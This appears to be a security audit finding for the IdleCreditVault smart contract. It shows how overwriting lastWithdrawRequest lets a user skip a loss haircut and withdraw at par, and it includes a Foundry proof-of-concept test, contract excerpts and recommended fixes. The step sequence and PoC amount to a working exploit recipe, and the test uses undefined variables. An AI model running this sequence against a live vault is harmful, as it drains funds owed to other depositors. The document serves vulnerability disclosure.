### Title
Loss-adjusted withdraw receipts are paid at par when a later request overwrites `lastWithdrawRequest[_user]` - ([File: contracts/strategies/idle/IdleCreditVault.sol])

### Summary
`IdleCreditVault` records a haircut for pending withdraw receipts in `lossRecoveryPriceByEpoch[epoch]` when `collectWithdrawFunds` is called with less than `pendingBasis`, but `_claimLossAdjustedWithdrawRequest` looks up that haircut solely via `lastWithdrawRequest[_user]`. If a user files a second withdraw request in a later epoch, `lastWithdrawRequest` is overwritten, the loss-epoch haircut is skipped, and `_claimFundedWithdrawRequest` pays the aggregate `withdrawsRequests[_user]` — including the haircutted receipt — at par, letting an unprivileged tranche holder withdraw more than they are owed and drain funds earmarked for other receipt holders.

### Finding Description
When an epoch stops with a realized loss, `IdleCDOEpochVariant.stopEpochWithDuration` calls `collectWithdrawFunds(_amount)` with `_amount < pendingWithdraws`. The vault stores the haircut `lossRecoveryPriceByEpoch[epochNumber] = _amount * RECOVERY_FULL / pendingBasis` and zeroes `pendingWithdraws`, but it leaves `withdrawsRequests[_user]` and `withdrawsRequestsByEpoch[_user][lossEpoch]` intact so users can later claim the reduced amount [1](#0-0) .

The claim path in `claimWithdrawRequest` first tries `_claimLossAdjustedWithdrawRequest`, which reads the loss epoch from `lastWithdrawRequest[_user]`. `lastWithdrawRequest[_user]` is set on every `requestWithdraw` to `epochNumber` [2](#0-1) . So:

1. Epoch N: user calls `requestWithdraw`; `lastWithdrawRequest[user] = N`, `withdrawsRequestsByEpoch[user][N] += amt`.
2. Manager stops epoch N with a loss: `lossRecoveryPriceByEpoch[N] = price < RECOVERY_FULL`, `pendingWithdraws = 0`.
3. Epoch N+1: user calls `requestWithdraw` again (allowed — `allowAA/BBWithdrawRequest` stay enabled); `lastWithdrawRequest[user] = N+1`, `withdrawsRequestsByEpoch[user][N+1] += amt2`.
4. Manager stops epoch N+1 fully funded. User calls `claimWithdrawRequest`.
5. `_claimLossAdjustedWithdrawRequest` reads `lossEpoch = N+1`, finds `lossRecoveryPriceByEpoch[N+1] == 0`, returns 0 [3](#0-2) .
6. `_claimFundedWithdrawRequest` passes the `epochNumber > lastWithdrawRequest` check and pays `withdrawsRequests[user] = amt + amt2` **at par**, burning the full receipt and transferring the un-haircutted amount [4](#0-3) .

The epoch-N haircut is never applied because `_claimLossAdjustedWithdrawRequest` only inspects the *latest* request epoch, not any earlier epoch that has a stored `lossRecoveryPriceByEpoch`. No guard (`skipDefaultCheck`, epoch gating, `_onlyIdleCDO`, KYC) prevents sequencing a second request after a lossy stop.

### Impact Explanation
The attacker recovers `(amt * (RECOVERY_FULL - lossRecoveryPrice) / RECOVERY_FULL)` more than entitled — i.e., the entire haircut the loss waterfall assigned to their receipt. This is a direct theft of funded underlying held in the vault's funded-claim reserve: the extra payout is drawn from the same pool that pays other users' funded receipts, so the last claimants are left unbacked (protocol insolvency for those receipts, up to the full haircut amount per offending user). Any KYC-passing tranche holder can execute this; manager/owner remain honest.

### Likelihood Explanation
Likelihood is moderate-to-high: the trigger requires only that an epoch ends with a partial-loss `stopEpochWithDuration` (a supported flow — `previewLossAdjustedWithdrawFunds`/`collectWithdrawFunds` exist precisely for it) followed by a second user `requestWithdraw` in a later epoch before claiming. Both are normal user actions; no privileged misbehavior or timing luck is needed beyond a lossy stop, which is an anticipated event in a credit vault.

### Recommendation
Track per-epoch loss claims instead of keying the loss path off `lastWithdrawRequest[_user]`. Options:
- Iterate/record each request epoch per user (e.g., an array or checkpoint mapping of request epochs) and, in `claimWithdrawRequest`, settle every epoch `e` with `lossRecoveryPriceByEpoch[e] != 0` via `_clearWithdrawClaimForEpoch` before paying the funded remainder.
- Alternatively, subtract the haircutted portion from `withdrawsRequests[_user]` at `collectWithdrawFunds` time (store per-user pending basis) so the aggregate funded bucket never includes loss-adjusted receipts.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "forge-std/Test.sol";
// assumes repo test helpers: idleCDO/cdoEpoch, strategy (IdleCreditVault),
// underlying, AAtranche, owner/manager/borrower wiring as in test/foundry/IdleCreditVault.t.sol

contract LossAdjustedClaimBypassPoC is Test {
    // deploy: IdleCDOEpochVariant + IdleCreditVault, APR > 0, wallet allowed
    function testSecondRequestBypassesLossHaircut() external {
        address alice = makeAddr("alice");
        uint256 depositAmt = 10_000 * 1e6; // USDC-like

        // Alice deposits AA, epoch 0 starts
        _depositWithUser(alice, depositAmt);
        vm.prank(manager);
        cdoEpoch.startEpoch();

        // Alice requests withdraw of half during epoch 0
        uint256 trancheBal = AAtranche.balanceOf(alice);
        vm.prank(alice);
        cdoEpoch.requestWithdraw(trancheBal / 2, address(AAtranche));
        // lastWithdrawRequest[alice] = epochNumber(=0) in strategy
        // withdrawsRequestsByEpoch[alice][0] = amt0

        // Epoch 0 ends with a partial loss on pending receipts:
        uint256 pendingBasis = strategy.pendingWithdraws();
        uint256 activeBasis  = cdoEpoch.getContractValue() + cdoEpoch.expectedEpochInterest();
        uint256 totalBasis   = activeBasis + pendingBasis;
        uint256 loss         = totalBasis / 2; // 50% loss -> receipts get ~pendingLoss haircut
        (uint256 pendingToFund,) = strategy.previewLossAdjustedWithdrawFunds(loss);
        uint256 repay = cdoEpoch.expectedEpochInterest() + pendingToFund;
        deal(address(underlying), borrower, repay);
        vm.startPrank(borrower);
        underlying.approve(address(cdoEpoch), repay);
        vm.stopPrank();
        vm.warp(cdoEpoch.epochEndDate() + 1);
        vm.prank(manager);
        cdoEpoch.stopEpochWithDuration(10e18, 0, 7 days, loss);
        // lossRecoveryPriceByEpoch[1] < RECOVERY_FULL (epochNumber incremented at stop)

        uint256 lossEpoch = strategy.epochNumber(); // epoch holding the haircut
        uint256 haircutPrice = strategy.lossRecoveryPriceByEpoch(lossEpoch);
        assertGt(haircutPrice, 0);
        assertLt(haircutPrice, 1e18); // RECOVERY_FULL

        // Epoch runs again; Alice files a SECOND withdraw request -> lastWithdrawRequest overwritten
        vm.prank(manager);
        cdoEpoch.startEpoch();
        vm.prank(alice);
        cdoEpoch.requestWithdraw(0, address(AAtranche)); // rest of her tranches

        // Epoch ends fully funded
        uint256 repay2 = cdoEpoch.expectedEpochInterest() + strategy.pendingWithdraws();
        deal(address(underlying), borrower, repay2);
        vm.startPrank(borrower);
        underlying.approve(address(cdoEpoch), repay2);
        vm.stopPrank();
        vm.warp(cdoEpoch.epochEndDate() + 1);
        vm.prank(manager);
        cdoEpoch.stopEpoch(0, 0);

        // Alice claims: loss path keyed on lastWithdrawRequest (=new epoch) finds price 0,
        // funded path pays aggregate withdrawsRequests[alice] AT PAR.
        uint256 balPre = underlying.balanceOf(alice);
        vm.prank(alice); // via cdo.claimWithdrawRequest flow
        IdleCDOEpochVariant(address(cdoEpoch)).claimWithdrawRequest(alice);
        uint256 paid = underlying.balanceOf(alice) - balPre;

        // Expected (correct) payout:
        uint256 expectedLossy = amt0 * haircutPrice / 1e18;
        uint256 expected = expectedLossy + amt1; // amt1 = second request basis
        assertGt(paid, expected); // BUG: alice receives amt0 + amt1 at par
    }
}
```

The assertion demonstrates the overpayment: the epoch-0 receipt `amt0` is paid at full value instead of `amt0 * lossRecoveryPriceByEpoch[lossEpoch] / RECOVERY_FULL`, withdrawing underlying that belongs to the vault's funded-claim reserve and leaving later claimants unbacked.

```text
  function _claimFundedWithdrawRequest(address _user) internal returns (uint256 amount) {
    // User should wait at least an epoch before claiming the withdraw. Once the epoch is over user can withdraw 
    // at any time even if a new epoch started. 
    // So if epochNumber is the same as the last withdraw request then we revert. Epoch number is increased at stopEpoch
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);
  }
```

```text
  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
    }
    if (_amount != 0) {
      underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
    }
```

```text
  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
  }
```
